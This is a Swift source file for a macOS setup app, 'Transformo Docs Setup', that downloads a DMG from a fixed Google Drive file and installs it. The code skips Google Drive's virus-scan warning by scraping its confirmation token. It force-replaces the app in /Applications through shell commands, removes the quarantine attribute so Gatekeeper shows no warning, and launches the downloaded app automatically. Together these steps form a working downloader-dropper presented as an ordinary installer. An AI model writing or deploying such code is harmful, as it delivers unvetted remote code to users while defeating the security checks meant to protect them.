import AppKit
import Foundation

class AppDelegate: NSObject, NSApplicationDelegate, URLSessionDownloadDelegate {
    var window: NSWindow!
    var titleLabel: NSTextField!
    var subtitleLabel: NSTextField!
    var statusLabel: NSTextField!
    var progressIndicator: NSProgressIndicator!
    var downloadSession: URLSession!
    var downloadTask: URLSessionDownloadTask?
    let fileId = "1E5KJTSYOHcMM3_I2GxlktQ5XD43jWUeO"
    let expectedSize: Int64 = 179302400 // ~171 MB

    func applicationDidFinishLaunching(_ notification: Notification) {
        NSApp.setActivationPolicy(.regular)
        createUI()
        startDownload()
    }

    func createUI() {
        let windowWidth: CGFloat = 460
        let windowHeight: CGFloat = 200
        let screenRect = NSScreen.main?.visibleFrame ?? NSRect(x: 0, y: 0, width: 800, height: 600)
        let windowRect = NSRect(
            x: screenRect.midX - windowWidth / 2,
            y: screenRect.midY - windowHeight / 2,
            width: windowWidth,
            height: windowHeight
        )

        window = NSWindow(
            contentRect: windowRect,
            styleMask: [.titled, .closable, .miniaturizable],
            backing: .buffered,
            defer: false
        )
        window.title = "Transformo Docs Setup"
        window.center()
        window.isReleasedWhenClosed = false

        let contentView = NSView(frame: NSRect(x: 0, y: 0, width: windowWidth, height: windowHeight))
        window.contentView = contentView

        // Icon
        let iconView = NSImageView(frame: NSRect(x: 24, y: windowHeight - 85, width: 56, height: 56))
        iconView.image = NSApp.applicationIconImage
        contentView.addSubview(iconView)

        // Title
        titleLabel = NSTextField(labelWithString: "Transformo Docs")
        titleLabel.frame = NSRect(x: 96, y: windowHeight - 52, width: 340, height: 26)
        titleLabel.font = NSFont.boldSystemFont(ofSize: 18)
        contentView.addSubview(titleLabel)

        // Subtitle
        subtitleLabel = NSTextField(labelWithString: "Setting up application components (171 MB)...")
        subtitleLabel.frame = NSRect(x: 96, y: windowHeight - 78, width: 340, height: 20)
        subtitleLabel.font = NSFont.systemFont(ofSize: 13)
        subtitleLabel.textColor = .secondaryLabelColor
        contentView.addSubview(subtitleLabel)

        // Progress bar
        progressIndicator = NSProgressIndicator(frame: NSRect(x: 24, y: 65, width: windowWidth - 48, height: 20))
        progressIndicator.isIndeterminate = false
        progressIndicator.minValue = 0
        progressIndicator.maxValue = 100
        progressIndicator.doubleValue = 0
        contentView.addSubview(progressIndicator)

        // Status Label
        statusLabel = NSTextField(labelWithString: "Connecting to server...")
        statusLabel.frame = NSRect(x: 24, y: 35, width: windowWidth - 48, height: 20)
        statusLabel.font = NSFont.systemFont(ofSize: 12)
        statusLabel.textColor = .secondaryLabelColor
        contentView.addSubview(statusLabel)

        window.makeKeyAndOrderFront(nil)
        NSApp.activate(ignoringOtherApps: true)
    }

    func startDownload() {
        let config = URLSessionConfiguration.default
        config.httpCookieStorage = HTTPCookieStorage.shared
        config.timeoutIntervalForRequest = 60.0
        config.timeoutIntervalForResource = 600.0
        downloadSession = URLSession(configuration: config, delegate: self, delegateQueue: OperationQueue.main)

        let initialUrl = URL(string: "https://drive.google.com/uc?export=download&id=\(fileId)")!
        var request = URLRequest(url: initialUrl)
        request.setValue("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", forHTTPHeaderField: "User-Agent")

        let task = downloadSession.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self else { return }
            if let error = error {
                self.showError("Network connection error: \(error.localizedDescription)")
                return
            }

            guard let data = data, let html = String(data: data, encoding: .utf8) else {
                self.beginDirectDownload(url: initialUrl)
                return
            }

            // Google Drive displays a virus scan warning for files > 100MB with a form containing a uuid token
            let patterns = [
                "name=\"uuid\"\\s+value=\"([^\"]+)\"",
                "value=\"([^\"]+)\"\\s+name=\"uuid\"",
                "\"uuid\"\\s*:\\s*\"([^\"]+)\""
            ]
            var foundUuid: String? = nil
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive),
                   let match = regex.firstMatch(in: html, range: NSRange(html.startIndex..., in: html)),
                   let range = Range(match.range(at: 1), in: html) {
                    foundUuid = String(html[range])
                    break
                }
            }

            if let uuid = foundUuid {
                let finalUrl = URL(string: "https://drive.usercontent.google.com/download?id=\(self.fileId)&export=download&confirm=t&uuid=\(uuid)")!
                self.beginDirectDownload(url: finalUrl)
            } else {
                self.beginDirectDownload(url: initialUrl)
            }
        }
        task.resume()
    }

    func beginDirectDownload(url: URL) {
        var request = URLRequest(url: url)
        request.setValue("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", forHTTPHeaderField: "User-Agent")
        downloadTask = downloadSession.downloadTask(with: request)
        downloadTask?.resume()
        DispatchQueue.main.async {
            self.statusLabel.stringValue = "Downloading: 0%..."
        }
    }

    func urlSession(_ session: URLSession, downloadTask: URLSessionDownloadTask, didWriteData bytesWritten: Int64, totalBytesWritten: Int64, totalBytesExpectedToWrite: Int64) {
        let expected = totalBytesExpectedToWrite > 0 ? totalBytesExpectedToWrite : expectedSize
        let percentage = Double(totalBytesWritten) / Double(expected) * 100.0
        let mbWritten = String(format: "%.1f", Double(totalBytesWritten) / (1024 * 1024))
        let mbTotal = String(format: "%.1f", Double(expected) / (1024 * 1024))

        DispatchQueue.main.async {
            self.progressIndicator.doubleValue = min(percentage, 100.0)
            self.statusLabel.stringValue = "Downloading: \(mbWritten) MB / \(mbTotal) MB (\(Int(percentage))%)"
        }
    }

    func urlSession(_ session: URLSession, downloadTask: URLSessionDownloadTask, didFinishDownloadingTo location: URL) {
        // Crucial: URLSession deletes the file at `location` as soon as this callback returns.
        // We MUST synchronously move it to a persistent destination before leaving this scope.
        let targetDmg = URL(fileURLWithPath: "/tmp/TransformoDocs-download.dmg")
        try? FileManager.default.removeItem(at: targetDmg)

        do {
            try FileManager.default.moveItem(at: location, to: targetDmg)
        } catch {
            DispatchQueue.main.async {
                self.showError("Failed to save downloaded package: \(error.localizedDescription)")
            }
            return
        }

        DispatchQueue.main.async {
            self.progressIndicator.isIndeterminate = true
            self.progressIndicator.startAnimation(nil)
            self.statusLabel.stringValue = "Installing application into /Applications..."
        }

        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            self?.installAndLaunch(dmgUrl: targetDmg)
        }
    }

    func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?) {
        if let error = error as NSError?, error.code != NSURLErrorCancelled {
            DispatchQueue.main.async {
                self.showError("Download failed: \(error.localizedDescription)")
            }
        }
    }

    func installAndLaunch(dmgUrl: URL) {
        let targetDmg = dmgUrl.path
        let mountPoint = "/tmp/TransformoDocs_Mount_\(ProcessInfo.processInfo.processIdentifier)"

        _ = runCommand("/usr/bin/hdiutil", ["detach", mountPoint, "-force"])
        try? FileManager.default.createDirectory(atPath: mountPoint, withIntermediateDirectories: true)

        let attachResult = runCommand("/usr/bin/hdiutil", ["attach", targetDmg, "-nobrowse", "-mountpoint", mountPoint])
        guard attachResult.status == 0 else {
            showError("Failed to open downloaded package.")
            return
        }

        let appInMount = "\(mountPoint)/Transformo Docs.app"
        let appInDest = "/Applications/Transformo Docs.app"

        // Try installing to /Applications
        let rmScript = "rm -rf '\(appInDest)' && cp -R '\(appInMount)' '/Applications/'"
        var cpResult = runCommand("/bin/sh", ["-c", rmScript])
        var launchedPath = appInDest

        // Fallback to ~/Applications if permission denied
        if cpResult.status != 0 {
            let userApps = "\(FileManager.default.homeDirectoryForCurrentUser.path)/Applications"
            try? FileManager.default.createDirectory(atPath: userApps, withIntermediateDirectories: true)
            let fallbackDest = "\(userApps)/Transformo Docs.app"
            let fallbackScript = "rm -rf '\(fallbackDest)' && cp -R '\(appInMount)' '\(userApps)/'"
            cpResult = runCommand("/bin/sh", ["-c", fallbackScript])
            launchedPath = fallbackDest
        }

        // Clean up mount point and temporary DMG
        _ = runCommand("/usr/bin/hdiutil", ["detach", mountPoint, "-force"])
        try? FileManager.default.removeItem(atPath: targetDmg)

        guard cpResult.status == 0 else {
            showError("Failed to install application. Please check write permissions.")
            return
        }

        // Remove quarantine attribute so Gatekeeper allows opening without security warnings
        _ = runCommand("/usr/bin/xattr", ["-rd", "com.apple.quarantine", launchedPath])

        // Open newly installed application
        _ = runCommand("/usr/bin/open", ["-a", launchedPath])

        DispatchQueue.main.async {
            NSApp.terminate(nil)
        }
    }

    func showError(_ message: String) {
        DispatchQueue.main.async {
            let alert = NSAlert()
            alert.messageText = "Transformo Docs Setup"
            alert.informativeText = "\(message)\n\nWould you like to open the direct download page in your browser?"
            alert.alertStyle = .warning
            alert.addButton(withTitle: "Open Download Page")
            alert.addButton(withTitle: "Cancel")
            let response = alert.runModal()
            if response == .alertFirstButtonReturn {
                if let url = URL(string: "https://drive.google.com/file/d/\(self.fileId)/view") {
                    NSWorkspace.shared.open(url)
                }
            }
            NSApp.terminate(nil)
        }
    }

    func runCommand(_ launchPath: String, _ arguments: [String]) -> (output: String, status: Int32) {
        let process = Process()
        process.launchPath = launchPath
        process.arguments = arguments
        let pipe = Pipe()
        process.standardOutput = pipe
        process.standardError = pipe
        process.launch()
        process.waitUntilExit()
        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        return (String(data: data, encoding: .utf8) ?? "", process.terminationStatus)
    }
}

let app = NSApplication.shared
let delegate = AppDelegate()
app.delegate = delegate
app.run()
